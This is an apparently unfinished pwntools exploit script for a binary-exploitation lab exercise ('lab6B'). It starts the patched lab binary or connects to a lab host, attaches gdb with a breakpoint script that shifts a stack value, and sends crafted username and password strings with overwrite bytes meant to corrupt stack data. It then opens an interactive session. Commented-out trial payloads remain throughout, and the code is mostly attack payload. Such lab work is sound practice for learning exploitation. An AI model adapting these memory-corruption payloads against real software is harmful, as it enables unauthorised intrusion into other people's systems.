from pwn import *
import subprocess
import time
import signal

def sigint_handler(signum, frame):
    term_gdb.kill()
    exit()
 
signal.signal(signal.SIGINT, sigint_handler)


# context.terminal = ['tmux', 'splitw', '-h']

IP = '172.16.70.133'
PORT = 6642
local = True
if not local:
    r = remote(IP, PORT)
else:
    r = process("./lab6B-patched")

gdbscript_file = 'lab6B.gdb.txt'

#### Notes ####
# on my development machine I had a null byte in ebp
# so I added some gdb functions work around this
#### End ####

f = open(gdbscript_file, 'w')
f.write('''
set follow-fork-mode child
break hash_pass
commands 1
set *(int*)($esp+236) = *(int*)($esp+236) + 4
end
break *login_prompt+296
continue
x/64xw $esp
''')

'''
commands 1
set *(int*)($esp+224) = *(int*)($esp+224) + 4
end
'''

f.close()

# r.interactive()

term_gdb = subprocess.Popen(['terminator', '-e', '/usr/bin/gdb "./lab6B-patched" %d -x "%s"' % (r.pid, gdbscript_file)])
# print 'tmux splitw -h /usr/bin/gdb "./lab6B" %d -x "%s"' % (r.pid, gdbscript_file)
# term_gdb = subprocess.Popen(['tmux', 'splitw', '-h', '/usr/bin/gdb "./lab6B" %d -x "%s"' % (r.pid, gdbscript_file)])
time.sleep(1)

# r.recv(200)

# raw_input()

username='A'*12+'\x41\x41\x20\x02'+'A'*16
password='B'*4+'\xff\xff\xff\xfc'+'B'*4+'\x41\x41\25\x88'

print len(username)
print len(password)

arr = range(0, 32)
password_list = []
for c in arr:
    password_list.append(chr(ord('B') + c))
password = "".join(password_list)

username = 'A' * 32
# password = 'B' * 32
# password = 'BBBBCCCCDDDDEEEEFFFFZZZZHHHHIIII'
password = 'BBBB\xbb\xbb\xbb\xb8DDDDEEEEFFFF'
password += '\xcb\x44AA'
# password += 'BB\x44\xcb'
password += 'HHHHIIII'# * (32 - len(password))

# username = "A" * 32
# password = "B" * 4 + "\xff\xff\xff\xff" + "B"*12 + "\xbe\xbe\xbe\xbe" + "B" * 8

username = "A" * 32
password = "B" * 4 + "\xff\xff\xff\xff" + "B"*12 + "\xbe\xbe\xbe\xbe" + "B" * 8

r.sendlineafter('username:', username)
r.sendlineafter('password:', password)


username = "A" * 4 + "\xbe\xbe\xbe\xbe" + "A"*24
password = "B" * 4 + "\xff\xff\xff\xff" + "B"*12 + "\x34\xbb\xbe\xbe" + "B" * 8

r.sendlineafter('username:', username)
r.sendlineafter('password:', password)

r.interactive()

